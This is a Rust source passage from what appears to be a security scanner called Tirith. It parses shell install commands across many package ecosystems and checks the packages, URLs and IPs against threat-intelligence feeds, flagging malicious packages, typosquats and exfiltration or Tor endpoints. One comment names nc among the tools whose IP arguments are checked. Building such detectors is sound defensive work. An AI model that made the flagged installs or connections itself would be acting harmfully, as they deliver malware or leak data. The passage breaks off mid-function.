use std::net::Ipv4Addr;

use crate::extract::ExtractedUrl;
use crate::threatdb::{self, Ecosystem, PackageThreatAssessment, ThreatDb};
use crate::tokenize::{Segment, ShellType};
use crate::verdict::{Evidence, Finding, RuleId, Severity};
use crate::version_intent::VersionIntent;

/// A reference to a package extracted from a shell command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PackageRef {
    pub ecosystem: Ecosystem,
    /// The canonical target package used for every security lookup.
    pub name: String,
    /// User-facing npm alias, when the command addressed `name@npm:target`.
    /// This must never participate in threat-DB or reputation decisions.
    pub alias: Option<String>,
    /// How the version was expressed. An unpinned install is `Unspecified`; an
    /// unparsed range is a `Constraint` and is treated as unresolved, never
    /// silently as an exact pin.
    pub version: VersionIntent,
}

/// Split a `name<sep>version` string (e.g. `serde@1.0`) into a name and an
/// explicit [`VersionIntent`]. The version part is interpreted as an explicit
/// single token (exact pin if plain, unresolved constraint otherwise).
fn split_name_version(
    s: &str,
    sep: char,
    parse: fn(&str) -> VersionIntent,
) -> (&str, VersionIntent) {
    if let Some(pos) = s.find(sep) {
        let name = &s[..pos];
        let ver = &s[pos + 1..];
        (name, parse(ver))
    } else {
        (s, VersionIntent::Unspecified)
    }
}

/// Like [`split_name_version`] but for Cargo, where a PLAIN version is a caret
/// REQUIREMENT (`serde@1.0` == `^1.0`), not an exact pin (see
/// [`VersionIntent::from_cargo_version`]).
fn split_name_version_cargo(s: &str, sep: char) -> (&str, VersionIntent) {
    if let Some(pos) = s.find(sep) {
        (&s[..pos], VersionIntent::from_cargo_version(&s[pos + 1..]))
    } else {
        (s, VersionIntent::Unspecified)
    }
}

/// Build a [`VersionIntent`] from an optional explicit version token; `None`
/// (and empty) becomes [`Unspecified`](VersionIntent::Unspecified).
fn maven_intent_from_opt_token(token: Option<&str>) -> VersionIntent {
    match token {
        Some(v) => VersionIntent::from_maven_version(v),
        None => VersionIntent::Unspecified,
    }
}

/// The outcome of package extraction, including whether the list is COMPLETE.
///
/// The bare `Vec<PackageRef>` has no way to say "there were more". A consumer
/// that assesses only what it was handed and reports a clean verdict is
/// asserting something the extractor never promised, so any consumer whose
/// output is a security decision must read [`Self::truncated`] and disclose it.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct ExtractedPackages {
    pub packages: Vec<PackageRef>,
    /// True when a per-invocation cap
    /// ([`crate::npm_command::MAX_PACKAGES_PER_INVOCATION`]) cut the list. The
    /// retained packages are a deterministic ordered prefix.
    pub truncated: bool,
}

/// POSIX compatibility entry point for callers that already tokenize without a
/// shell parameter.
pub fn extract_packages(segments: &[Segment]) -> Vec<PackageRef> {
    extract_packages_for_shell(segments, ShellType::Posix)
}

/// [`extract_packages`] with the completeness flag retained.
pub fn extract_packages_detail(segments: &[Segment]) -> ExtractedPackages {
    extract_packages_detail_for_shell(segments, ShellType::Posix)
}

/// Extract package references from tokenized shell segments. Recognizes
/// install/add commands for pip, npm, yarn, pnpm, bun, npx, cargo, gem, go,
/// composer, dotnet, Maven, and Gradle; skips flags and known non-package
/// arguments.
///
/// Command identity is resolved through the same wrapper resolver used by the
/// URL and command rules, then normalized using the selected shell. This keeps
/// `sudo pip ...`, `env npm ...`, Windows paths, and platform launcher suffixes
/// on the same threat-intelligence path as their bare forms.
pub fn extract_packages_for_shell(segments: &[Segment], shell: ShellType) -> Vec<PackageRef> {
    extract_packages_detail_for_shell(segments, shell).packages
}

/// [`extract_packages_for_shell`] with the completeness flag retained. Use this
/// wherever the result feeds a verdict.
pub fn extract_packages_detail_for_shell(
    segments: &[Segment],
    shell: ShellType,
) -> ExtractedPackages {
    let mut packages = Vec::new();
    let mut truncated = false;

    for seg in segments {
        let (resolved_command, resolved_args) =
            match crate::extract::resolve_wrapped_command_for_shell(seg, shell) {
                Some(resolved) => resolved,
                None => continue,
            };

        let cmd_name = package_command_name(&resolved_command, shell);
        let args: Vec<String> = resolved_args
            .iter()
            .map(|arg| crate::rules::command::normalize_shell_token(arg, shell))
            .collect();

        // The npm family has one grammar for every consumer; this module owns
        // no private copy of it. See `crate::npm_command`.
        if let Some(launcher) = crate::npm_command::NpmLauncher::from_basename(&cmd_name) {
            let invocation = crate::npm_command::parse_resolved(launcher, &args);
            truncated |= invocation.truncated;
            packages.extend(invocation.explicit_packages);
            continue;
        }

        match cmd_name.as_str() {
            "pip" | "pip3" | "uv" => {
                extract_pip_packages(&args, &mut packages);
            }
            "cargo" => {
                extract_cargo_packages(&args, &mut packages);
            }
            "gem" => {
                extract_gem_packages(&args, &mut packages);
            }
            "go" => {
                extract_go_packages(&args, &mut packages);
            }
            "composer" => {
                extract_composer_packages(&args, &mut packages);
            }
            "dotnet" => {
                extract_dotnet_packages(&args, &mut packages);
            }
            "mvn" | "mvnw" | "gradle" | "gradlew" => {
                extract_maven_packages(&args, &mut packages);
            }
            _ => {}
        }
    }

    ExtractedPackages {
        packages,
        truncated,
    }
}

const MAX_EXECUTABLE_PACKAGE_DEPTH: usize = 8;

fn collect_executable_segments(
    input: &str,
    shell: ShellType,
    depth: usize,
    segments: &mut Vec<(Segment, ShellType)>,
) {
    let execution_view = crate::extract::shell_execution_view(input, shell);
    segments.extend(
        crate::tokenize::tokenize(execution_view.as_ref(), shell)
            .into_iter()
            .map(|segment| (segment, shell)),
    );
    if depth >= MAX_EXECUTABLE_PACKAGE_DEPTH {
        return;
    }
    for body in crate::extract::executable_substitution_scan(input, shell).bodies {
        collect_executable_segments(&body.input, body.shell, depth + 1, segments);
    }
}

/// Extract package references from every statically visible executable body,
/// preserving each child wrapper's effective shell.
pub(crate) fn extract_packages_from_input(input: &str, shell: ShellType) -> Vec<PackageRef> {
    let mut segments = Vec::new();
    collect_executable_segments(input, shell, 0, &mut segments);
    let mut packages = Vec::new();
    for (segment, segment_shell) in segments {
        packages.extend(extract_packages_for_shell(&[segment], segment_shell));
    }
    packages
}

/// The truncation-disclosing finding for a package list that hit the grammar's
/// cap. Budget exhaustion is surfaced the way the rest of the engine surfaces
/// it (see [`RuleId::AnalysisIncomplete`] in `rules::command`): the unexamined
/// remainder is reported, never treated as clean.
fn truncated_package_list_finding() -> Finding {
    Finding {
        rule_id: RuleId::AnalysisIncomplete,
        severity: Severity::High,
        title: "Package list exceeded the analysis budget".to_string(),
        description: format!(
            "The command names more than {} distinct packages in a single invocation. Tirith \
             assessed the first {} and cannot vouch for the rest, so the command is reported as \
             incompletely analyzed instead of clean. Split the install into smaller commands to \
             have every package assessed.",
            crate::npm_command::MAX_PACKAGES_PER_INVOCATION,
            crate::npm_command::MAX_PACKAGES_PER_INVOCATION
        ),
        evidence: vec![Evidence::CommandPattern {
            pattern: "bounded package-extraction budget exhausted".to_string(),
            matched: "package operands omitted after the extraction cap".to_string(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// Return a normalized package-manager launcher name. Lives in
/// [`crate::npm_command`] so the npm family and every other ecosystem strip
/// wrappers, directories and platform executable suffixes identically.
fn package_command_name(command: &str, shell: ShellType) -> String {
    crate::npm_command::launcher_basename(command, shell)
}

/// Flags for pip that consume the next argument (so it should be skipped).
const PIP_ARG_FLAGS: &[&str] = &[
    "--index-url",
    "-i",
    "--extra-index-url",
    "--find-links",
    "-f",
    "--constraint",
    "-c",
    "--requirement",
    "-r",
    "--target",
    "-t",
    "--root",
    "--prefix",
    "--src",
    "--build",
    "-b",
    "--config-settings",
    "--global-option",
    "--install-option",
    "--proxy",
    "--retries",
    "--timeout",
    "--exists-action",
    "--trusted-host",
    "--cert",
    "--client-cert",
    "--cache-dir",
];

fn extract_pip_packages(args: &[String], packages: &mut Vec<PackageRef>) {
    let mut iter = args.iter();
    let mut found_install = false;
    while let Some(arg) = iter.next() {
        let lower = arg.to_lowercase();
        if !found_install {
            if lower == "install" {
                found_install = true;
            }
            continue;
        }

        if arg.starts_with('-') {
            if PIP_ARG_FLAGS.contains(&lower.as_str()) {
                let _ = iter.next();
            }
            continue;
        }

        // PEP 508 evaluates the requirement before the optional environment
        // marker. Registry identity and version scoring must therefore ignore
        // the `; marker` suffix just as pip does. Do this before URL/local-path
        // classification too: marker expressions can themselves contain `/`
        // and must not make an ordinary registry requirement disappear.
        // The shell tokenizer used by `tirith check` can retain a matching
        // outer quote pair around a complex requirement, whereas the install
        // CLI's exact argv has already had shell quoting removed. Normalize
        // that tokenizer representation before splitting the PEP 508 marker.
        let requirement_arg = arg.trim();
        let requirement_arg = requirement_arg
            .strip_prefix('\'')
            .and_then(|inner| inner.strip_suffix('\''))
            .or_else(|| {
                requirement_arg
                    .strip_prefix('"')
                    .and_then(|inner| inner.strip_suffix('"'))
            })
            .unwrap_or(requirement_arg);
        let pkg_str = requirement_arg
            .split_once(';')
            .map_or(requirement_arg, |(requirement, _)| requirement)
            .trim();
        if pkg_str.is_empty() {
            continue;
        }
        let lower_pkg = pkg_str.to_ascii_lowercase();

        // VCS / URL / PEP 508 direct-reference / local-path installs aren't
        // registry packages. PyPI distribution names cannot contain `@`, so
        // retaining one here would falsely score a direct source as a registry
        // identity (including schemeless VCS refs such as `git+ssh:host/repo`).
        if pkg_str.contains("://") || lower_pkg.starts_with("git+") || pkg_str.contains('@') {
            continue;
        }
        if pkg_str.contains('/') || pkg_str.contains('\\') || pkg_str.starts_with('.') {
            continue;
        }

        // Strip extras: `foo[bar,baz]==1.0` -> name=`foo`, rest=`==1.0`.
        let (name_part, rest) = if let Some(bracket_pos) = pkg_str.find('[') {
            if let Some(close_pos) = pkg_str[bracket_pos..].find(']') {
                let name = &pkg_str[..bracket_pos];
                let after = &pkg_str[bracket_pos + close_pos + 1..];
                (name, after)
            } else {
                (pkg_str, "")
            }
        } else {
            let split_pos = pkg_str
                .find("==")
                .or_else(|| pkg_str.find(">="))
                .or_else(|| pkg_str.find("<="))
                .or_else(|| pkg_str.find("~="))
                .or_else(|| pkg_str.find("!="))
                .or_else(|| pkg_str.find('>'))
                .or_else(|| pkg_str.find('<'));
            if let Some(pos) = split_pos {
                (&pkg_str[..pos], &pkg_str[pos..])
            } else {
                (pkg_str, "")
            }
        };

        // PEP 508 permits whitespace around a specifier, and accepts the
        // legacy parenthesized form (`name (==1.2.3)`). Normalize only this
        // grammar punctuation; the original argv remains untouched for
        // execution, coverage labels, JSON, and audit records.
        let mut name_part = name_part.trim();
        let mut rest = rest.trim();
        if let Some(inner) = rest
            .strip_prefix('(')
            .and_then(|inner| inner.strip_suffix(')'))
        {
            rest = inner.trim();
        } else if let (Some(name), Some(specifier)) =
            (name_part.strip_suffix('('), rest.strip_suffix(')'))
        {
            name_part = name.trim_end();
            rest = specifier.trim_end();
        }

        if name_part.is_empty() {
            continue;
        }

        // `rest` is the full PEP 440 specifier tail (e.g. `==1.2.3`, `>=1.4.4`,
        // `>=1.2,<2.0`, or empty). Parse it so an exact pin stays exact and a
        // range is resolved/excluded properly instead of being dropped.
        let version = VersionIntent::from_pep440_specifier(rest);
        let normalized = normalize_pypi_name(name_part);

        packages.push(PackageRef {
            ecosystem: Ecosystem::PyPI,
            name: normalized,
            alias: None,
            version,
        });
    }
}

/// Normalize a PyPI package name with the same registry identity used by all
/// ThreatDb indices (PEP 503 separator-run folding included).
fn normalize_pypi_name(name: &str) -> String {
    threatdb::canonical_package_name(Ecosystem::PyPI, name)
}

fn extract_cargo_packages(args: &[String], packages: &mut Vec<PackageRef>) {
    let mut iter = args.iter();
    let mut found_subcmd = false;

    while let Some(arg) = iter.next() {
        let lower = arg.to_lowercase();
        if !found_subcmd {
            if matches!(lower.as_str(), "install" | "add") {
                found_subcmd = true;
            }
            continue;
        }

        if arg.starts_with('-') {
            if matches!(
                lower.as_str(),
                "--version"
                    | "--vers"
                    | "--git"
                    | "--branch"
                    | "--tag"
                    | "--rev"
                    | "--path"
                    | "--registry"
                    | "--index"
                    | "--features"
                    | "-F"
                    | "--target-dir"
                    | "--root"
                    | "--jobs"
                    | "-j"
                    | "--rename"
            ) {
                // `--version` / `--vers` carries the version of the previously seen package.
                if lower == "--version" || lower == "--vers" {
                    if let Some(ver) = iter.next() {
                        if let Some(last) = packages.last_mut() {
                            if last.ecosystem == Ecosystem::Crates
                                && matches!(last.version, VersionIntent::Unspecified)
                            {
                                last.version = VersionIntent::from_cargo_version(ver);
                            }
                        }
                    }
                } else {
                    let _ = iter.next();
                }
                continue;
            }
            continue;
        }

        // git URLs and local paths aren't crates.io packages.
        if arg.contains("://") || arg.starts_with('.') || arg.contains('/') {
            continue;
        }

        let (name, version) = split_name_version_cargo(arg, '@');

        if !name.is_empty() {
            packages.push(PackageRef {
                ecosystem: Ecosystem::Crates,
                name: name.to_string(),
                alias: None,
                version,
            });
        }
    }
}

fn extract_gem_packages(args: &[String], packages: &mut Vec<PackageRef>) {
    let mut iter = args.iter();
    let mut found_install = false;

    while let Some(arg) = iter.next() {
        let lower = arg.to_lowercase();
        if !found_install {
            if lower == "install" {
                found_install = true;
            }
            continue;
        }

        if arg.starts_with('-') {
            if matches!(
                lower.as_str(),
                "--version" | "-v" | "--source" | "--platform" | "--install-dir" | "-i"
            ) {
                // `--version` / `-v` carries the version of the previously seen gem.
                if lower == "--version" || lower == "-v" {
                    if let Some(ver) = iter.next() {
                        if let Some(last) = packages.last_mut() {
                            if last.ecosystem == Ecosystem::RubyGems
                                && matches!(last.version, VersionIntent::Unspecified)
                            {
                                last.version = VersionIntent::from_gem_version(ver);
                            }
                        }
                    }
                } else {
                    let _ = iter.next();
                }
                continue;
            }
            continue;
        }

        // `gem install rails:7.0` form (also accepts bare name).
        let (name, version) = split_name_version(arg, ':', VersionIntent::from_gem_version);

        if !name.is_empty() {
            packages.push(PackageRef {
                ecosystem: Ecosystem::RubyGems,
                name: name.to_string(),
                alias: None,
                version,
            });
        }
    }
}

fn extract_go_packages(args: &[String], packages: &mut Vec<PackageRef>) {
    let mut found_subcmd = false;

    for arg in args {
        let lower = arg.to_lowercase();
        if !found_subcmd {
            if matches!(lower.as_str(), "get" | "install") {
                found_subcmd = true;
            }
            continue;
        }

        if arg.starts_with('-') {
            continue;
        }

        // `go get github.com/user/pkg@v1.2.3` form.
        let (name, version) = split_name_version(arg, '@', VersionIntent::from_go_version);

        if !name.is_empty() {
            packages.push(PackageRef {
                ecosystem: Ecosystem::Go,
                name: name.to_string(),
                alias: None,
                version,
            });
        }
    }
}

fn extract_composer_packages(args: &[String], packages: &mut Vec<PackageRef>) {
    let mut found_require = false;

    for arg in args {
        if !found_require {
            if arg.to_lowercase() == "require" {
                found_require = true;
            }
            continue;
        }

        if arg.starts_with('-') {
            continue;
        }

        // `composer require vendor/package:^1.0` form.
        let (name, version) = split_name_version(arg, ':', VersionIntent::from_composer_version);

        if !name.is_empty() {
            packages.push(PackageRef {
                ecosystem: Ecosystem::Packagist,
                name: name.to_string(),
                alias: None,
                version,
            });
        }
    }
}

fn extract_dotnet_packages(args: &[String], packages: &mut Vec<PackageRef>) {
    let mut iter = args.iter();
    let mut found_add = false;
    let mut found_package = false;

    while let Some(arg) = iter.next() {
        let lower = arg.to_lowercase();
        if !found_add {
            if lower == "add" {
                found_add = true;
            }
            continue;
        }

        // `dotnet add package <name>` — skip the project-file arg.
        if !found_package {
            if lower == "package" {
                found_package = true;
            }
            continue;
        }

        if arg.starts_with('-') {
            if lower == "--version" || lower == "-v" {
                if let Some(ver) = iter.next() {
                    if let Some(last) = packages.last_mut() {
                        if last.ecosystem == Ecosystem::NuGet
                            && matches!(last.version, VersionIntent::Unspecified)
                        {
                            last.version = VersionIntent::from_nuget_version(ver);
                        }
                    }
                }
                continue;
            }
            if matches!(lower.as_str(), "--source" | "-s" | "--framework" | "-f") {
                let _ = iter.next();
            }
            continue;
        }

        packages.push(PackageRef {
            ecosystem: Ecosystem::NuGet,
            name: arg.to_string(),
            alias: None,
            version: VersionIntent::Unspecified,
        });
    }
}

/// Extract Maven/Gradle dependency coordinates from command arguments.
///
/// Handles `mvn dependency:get -Dartifact=group:artifact:version` and
/// `gradle` dependency notation `group:artifact:version`.
fn extract_maven_packages(args: &[String], packages: &mut Vec<PackageRef>) {
    for arg in args {
        // mvn form: `-Dartifact=group:artifact:version[:packaging[:classifier]]`.
        if let Some(coord) = arg.strip_prefix("-Dartifact=") {
            let parts: Vec<&str> = coord.splitn(4, ':').collect();
            if parts.len() >= 2 {
                let name = format!("{}:{}", parts[0], parts[1]);
                let version = maven_intent_from_opt_token(parts.get(2).copied());
                packages.push(PackageRef {
                    ecosystem: Ecosystem::Maven,
                    name,
                    alias: None,
                    version,
                });
            }
            continue;
        }

        if arg.starts_with('-') {
            continue;
        }

        // Gradle dependency notation: `group:artifact:version`. Requiring all
        // three components also keeps Maven lifecycle goals such as
        // `dependency:get` from being misclassified as package coordinates.
        let parts: Vec<&str> = arg.splitn(4, ':').collect();
        if parts.len() >= 3 && !parts[0].is_empty() && !parts[1].is_empty() && !parts[2].is_empty()
        {
            let name = format!("{}:{}", parts[0], parts[1]);
            let version = maven_intent_from_opt_token(parts.get(2).copied());
            packages.push(PackageRef {
                ecosystem: Ecosystem::Maven,
                name,
                alias: None,
                version,
            });
        }
    }
}

/// Extract an IPv4 address from a shell token: bare, `user@IP`, `IP:port`,
/// `user@IP:port`. Does NOT match IPv6, non-IP text, or IPs inside URLs (those
/// are handled by URL extraction).
pub fn extract_ipv4_from_token(token: &str) -> Option<Ipv4Addr> {
    extract_ipv4_from_token_for_shell(token, ShellType::Posix)
}

/// Shell-aware form used by the engine. Keeping the POSIX compatibility helper
/// above avoids forcing callers that already hold normalized tokens to invent a
/// shell while ensuring command analysis follows the selected shell's quoting
/// and escaping rules.
pub fn extract_ipv4_from_token_for_shell(token: &str, shell: ShellType) -> Option<Ipv4Addr> {
    let normalized = crate::rules::command::normalize_shell_token(token.trim(), shell);
    let after_at = if let Some(at_pos) = normalized.rfind('@') {
        &normalized[at_pos + 1..]
    } else {
        normalized.as_str()
    };

    // Only strip a trailing `:NNNN`; anything else after `:` is likely an IPv6
    // literal we shouldn't touch.
    let ip_str = if let Some(colon_pos) = after_at.rfind(':') {
        let after_colon = &after_at[colon_pos + 1..];
        if !after_colon.is_empty() && after_colon.chars().all(|c| c.is_ascii_digit()) {
            &after_at[..colon_pos]
        } else {
            after_at
        }
    } else {
        after_at
    };

    // Some formats wrap with `[...]`.
    let ip_str = ip_str.trim_matches(|c| c == '[' || c == ']');

    ip_str.parse::<Ipv4Addr>().ok()
}

/// Map threat-DB confidence to finding severity. `pub(crate)` so the ecosystem
/// scan path (A1e) maps an `ExactMatch` to the same severity as this command path.
pub(crate) fn confidence_to_severity(c: threatdb::Confidence) -> Severity {
    match c {
        threatdb::Confidence::Confirmed => Severity::Critical,
        threatdb::Confidence::Medium => Severity::Medium,
        threatdb::Confidence::Low => Severity::Medium,
    }
}

fn hostname_rule_for_source(source: threatdb::ThreatSource) -> (RuleId, Severity, &'static str) {
    match source {
        threatdb::ThreatSource::Urlhaus => (
            RuleId::ThreatMaliciousUrl,
            Severity::High,
            "malicious hostname",
        ),
        threatdb::ThreatSource::PhishingArmy | threatdb::ThreatSource::PhishTank => (
            RuleId::ThreatPhishingUrl,
            Severity::High,
            "phishing hostname",
        ),
        threatdb::ThreatSource::ThreatFoxIoc => {
            (RuleId::ThreatThreatFoxIoc, Severity::High, "IOC hostname")
        }
        // Enumerated explicitly (no `_` arm) so the compiler flags any new variant.
        threatdb::ThreatSource::OssfMalicious
        | threatdb::ThreatSource::DatadogMalicious
        | threatdb::ThreatSource::FeodoTracker
        | threatdb::ThreatSource::EcosystemsTyposquat
        | threatdb::ThreatSource::CisaKev
        | threatdb::ThreatSource::FireholIp
        | threatdb::ThreatSource::TorExit
        | threatdb::ThreatSource::ExfilEndpoint
        | threatdb::ThreatSource::DigitalSide => (
            RuleId::ThreatMaliciousUrl,
            Severity::High,
            "malicious hostname",
        ),
    }
}

fn ip_rule_for_source(source: threatdb::ThreatSource) -> (RuleId, Severity, &'static str) {
    match source {
        threatdb::ThreatSource::TorExit => {
            (RuleId::ThreatTorExitNode, Severity::Medium, "Tor exit node")
        }
        threatdb::ThreatSource::ThreatFoxIoc => {
            (RuleId::ThreatThreatFoxIoc, Severity::High, "IOC IP")
        }
        // Enumerated explicitly (no `_` arm) so the compiler flags any new variant.
        threatdb::ThreatSource::OssfMalicious
        | threatdb::ThreatSource::DatadogMalicious
        | threatdb::ThreatSource::FeodoTracker
        | threatdb::ThreatSource::EcosystemsTyposquat
        | threatdb::ThreatSource::CisaKev
        | threatdb::ThreatSource::Urlhaus
        | threatdb::ThreatSource::PhishingArmy
        | threatdb::ThreatSource::PhishTank
        | threatdb::ThreatSource::FireholIp
        | threatdb::ThreatSource::ExfilEndpoint
        | threatdb::ThreatSource::DigitalSide => {
            (RuleId::ThreatMaliciousIp, Severity::High, "malicious IP")
        }
    }
}

/// Which unresolved shape produced a [`RuleId::ThreatUnresolvedMaliciousPackage`].
#[derive(Debug, Clone, Copy)]
enum UnresolvedKind {
    /// No definite version (unpinned install, or a constraint/affected version
    /// outside the supported subset).
    Unresolved,
    /// A constraint that provably overlaps the affected versions.
    ConstraintIntersects,
}

fn package_display_name(pkg: &PackageRef) -> String {
    match &pkg.alias {
        Some(alias) => format!("{alias} (npm alias for {})", pkg.name),
        None => pkg.name.clone(),
    }
}

/// Build the Medium/Warn finding for a malicious-package name whose installed
/// version could not be resolved to a definite hit. Advises pinning to a known
/// non-affected version (the install-path resolution note).
fn unresolved_package_finding(
    pkg: &PackageRef,
    summary: &threatdb::ThreatMatchSummary,
    affected_versions: &[String],
    kind: UnresolvedKind,
) -> Finding {
    let display_name = package_display_name(pkg);
    let affected_list = if affected_versions.is_empty() {
        "unknown".to_string()
    } else {
        affected_versions.join(", ")
    };
    let request_desc = match kind {
        UnresolvedKind::Unresolved => match &pkg.version {
            VersionIntent::Unspecified => "No version was pinned".to_string(),
            VersionIntent::Constraint { raw, .. } => {
                format!("The constraint '{raw}' could not be fully resolved")
            }
            // Exact/Resolved never reach the unresolved path.
            other => format!("The request '{other:?}' could not be resolved"),
        },
        UnresolvedKind::ConstraintIntersects => match pkg.version.constraint_raw() {
            Some(raw) => format!("The constraint '{raw}' overlaps the affected versions"),
            None => "The request overlaps the affected versions".to_string(),
        },
    };
    Finding {
        rule_id: RuleId::ThreatUnresolvedMaliciousPackage,
        severity: Severity::Medium,
        title: format!(
            "Unresolved malicious {} package: {}",
            pkg.ecosystem, display_name
        ),
        description: format!(
            "Package '{}' in {} is flagged as malicious by {} for specific versions \
             ({affected_list}). {request_desc}, so the resolver might install an affected \
             version. Pin an exact non-affected version (or choose a different package) to \
             clear this warning.",
            display_name, pkg.ecosystem, summary.source_label,
        ),
        evidence: vec![Evidence::ThreatIntel {
            source: summary.source_label.clone(),
            threat_type: "unresolved_malicious_package".to_string(),
            confidence: summary.confidence,
            reference: summary.reference_url.clone(),
        }],
        human_view: None,
        agent_view: None,
        mitre_id: None,
        custom_rule_id: None,
    }
}

/// Check input against the local threat intelligence database. Fail-open: a
/// `None` db returns no findings. All lookups are in-memory, no network I/O.
pub fn check(
    input: &str,
    shell: ShellType,
    extracted: &[ExtractedUrl],
    db: Option<&ThreatDb>,
) -> Vec<Finding> {
    let db = match db {
        Some(d) => d,
        None => return Vec::new(), // fail-open: no DB → no findings
    };

    let mut findings = Vec::new();

    let mut executable_segments = Vec::new();
    collect_executable_segments(input, shell, 0, &mut executable_segments);
    let mut packages = Vec::new();
    let mut truncated = false;
    for (segment, segment_shell) in &executable_segments {
        let extracted =
            extract_packages_detail_for_shell(std::slice::from_ref(segment), *segment_shell);
        truncated |= extracted.truncated;
        packages.extend(extracted.packages);
    }
    // A partial package list must not read as a complete assessment. Emitted
    // before the per-package findings so the disclosure survives even when
    // every retained package is clean.
    if truncated {
        findings.push(truncated_package_list_finding());
    }

    for pkg in &packages {
        let db_eco = pkg.ecosystem;
        let display_name = package_display_name(pkg);

        match db.assess_package(db_eco, &pkg.name, &pkg.version) {
            PackageThreatAssessment::ExactMatch(summary) => {
                findings.push(Finding {
                    rule_id: RuleId::ThreatMaliciousPackage,
                    severity: confidence_to_severity(summary.confidence),
                    title: format!(
                        "Known malicious {} package: {}",
                        pkg.ecosystem, display_name
                    ),
                    description: format!(
                        "Package '{}' in {} is flagged as malicious by {}. {}",
                        display_name,
                        pkg.ecosystem,
                        summary.source_label,
                        if summary.all_versions_malicious {
                            "All versions are affected."
                        } else {
                            "Specific version(s) affected."
                        }
                    ),
                    evidence: vec![Evidence::ThreatIntel {
                        source: summary.source_label.clone(),
                        threat_type: "malicious_package".to_string(),
                        confidence: summary.confidence,
                        reference: summary.reference_url.clone(),
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
                // A confirmed exact hit suffices — skip the weaker name-similarity
                // checks for this package.
                continue;
            }
            PackageThreatAssessment::ConstraintIntersectsAffected {
                summary,
                affected_versions,
            } => {
                findings.push(unresolved_package_finding(
                    pkg,
                    &summary,
                    &affected_versions,
                    UnresolvedKind::ConstraintIntersects,
                ));
                // Do NOT short-circuit: the name may ALSO be a typosquat or near
                // a popular package, so fall through to those checks.
            }
            PackageThreatAssessment::Unresolved {
                summary,
                affected_versions,
                ..
            } => {
                findings.push(unresolved_package_finding(
                    pkg,
                    &summary,
                    &affected_versions,
                    UnresolvedKind::Unresolved,
                ));
                // Fall through (see above).
            }
            // A proven exclusion or no record: nothing to add; the name-shape
            // checks below still run.
            PackageThreatAssessment::ConstraintExcludesAffected
            | PackageThreatAssessment::NoRecord => {}
        }

        if let Some(t) = db.check_typosquat(db_eco, &pkg.name) {
            findings.push(Finding {
                rule_id: RuleId::ThreatPackageTyposquat,
                severity: Severity::High,
                title: format!("Confirmed typosquat: {} → {}", display_name, t.target_name),
                description: format!(
                    "Package '{}' in {} is a confirmed typosquat of '{}' \
                     (source: ecosyste.ms typosquatting dataset).",
                    display_name, pkg.ecosystem, t.target_name
                ),
                evidence: vec![Evidence::ThreatIntel {
                    source: "ecosyste.ms Typosquats".to_string(),
                    threat_type: "typosquat".to_string(),
                    confidence: threatdb::Confidence::Confirmed,
                    reference: None,
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }

        if let Some((popular_name, distance)) = db.check_popular_distance(db_eco, &pkg.name) {
            findings.push(Finding {
                rule_id: RuleId::ThreatPackageSimilarName,
                severity: Severity::Medium,
                title: format!(
                    "Package name similar to popular package: {} ≈ {}",
                    display_name, popular_name
                ),
                description: format!(
                    "Package '{}' in {} is within edit distance {} of popular package '{}'. \
                     This could indicate a typosquatting attempt.",
                    display_name, pkg.ecosystem, distance, popular_name
                ),
                evidence: vec![Evidence::ThreatIntel {
                    source: "popular package names".to_string(),
                    threat_type: "similar_name".to_string(),
                    confidence: threatdb::Confidence::Low,
                    reference: None,
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    let mut checked_ips = std::collections::HashSet::new();
    let mut checked_urls = std::collections::HashSet::new();
    for url_info in extracted {
        // pr173-0020 — exact malicious-URL lookup: the v2 compiler stores
        // explicit OpenSSF malicious URLs, and this is the production query.
        // The compiler's canonicalization is a plain trim, so apply the same
        // here. Emitted BEFORE the hostname check and deduplicated against it:
        // an exact-URL hit subsumes a same-host hostname finding.
        let canonical_url = url_info.raw.trim();
        let mut exact_url_matched = false;
        if !canonical_url.is_empty() && checked_urls.insert(canonical_url.to_string()) {
            if let Some(source) = db.check_malicious_url(canonical_url) {
                exact_url_matched = true;
                findings.push(Finding {
                    rule_id: RuleId::ThreatMaliciousUrl,
                    severity: Severity::High,
                    title: format!("Known malicious URL: {canonical_url}"),
                    description: format!(
                        "The exact URL '{canonical_url}' is flagged as malicious by {}.",
                        source.label()
                    ),
                    evidence: vec![Evidence::ThreatIntel {
                        source: source.label().to_string(),
                        threat_type: "malicious_url".to_string(),
                        confidence: threatdb::Confidence::Confirmed,
                        reference: None,
                    }],
                    human_view: None,
                    agent_view: None,
                    mitre_id: None,
                    custom_rule_id: None,
                });
            }
        }

        if let Some(host) = url_info.parsed.host() {
            if !exact_url_matched {
                if let Some(m) = db.check_hostname(host) {
                    let (rule_id, severity, threat_type) = hostname_rule_for_source(m.source);
                    findings.push(Finding {
                        rule_id,
                        severity,
                        title: format!("Threat intelligence hostname match: {}", host),
                        description: format!(
                            "Hostname '{}' appears in threat intelligence feed ({}).",
                            host,
                            m.source.label()
                        ),
                        evidence: vec![Evidence::ThreatIntel {
                            source: m.source.label().to_string(),
                            threat_type: threat_type.to_string(),
                            confidence: m.confidence,
                            reference: m.reference_url,
                        }],
                        human_view: None,
                        agent_view: None,
                        mitre_id: None,
                        custom_rule_id: None,
                    });
                }
            }

            // URL host may itself be an IP literal.
            if let Ok(ip) = host.parse::<std::net::Ipv4Addr>() {
                if checked_ips.insert(ip) {
                    if let Some(m) = db.check_ip(ip) {
                        let (rule_id, severity, threat_type) = ip_rule_for_source(m.source);
                        findings.push(Finding {
                            rule_id,
                            severity,
                            title: format!("Threat intelligence IP match in URL: {}", ip),
                            description: format!(
                                "IP address {} (from URL) is flagged by {}.",
                                ip,
                                m.source.label()
                            ),
                            evidence: vec![Evidence::ThreatIntel {
                                source: m.source.label().to_string(),
                                threat_type: threat_type.to_string(),
                                confidence: m.confidence,
                                reference: m.reference_url,
                            }],
                            human_view: None,
                            agent_view: None,
                            mitre_id: None,
                            custom_rule_id: None,
                        });
                    }
                }
            }
        }
    }

    // IP literals in command tokens (ssh/scp/nc and friends).
    for (seg, segment_shell) in &executable_segments {
        for arg in &seg.args {
            if let Some(ip) = extract_ipv4_from_token_for_shell(arg, *segment_shell) {
                if checked_ips.insert(ip) {
                    if let Some(m) = db.check_ip(ip) {
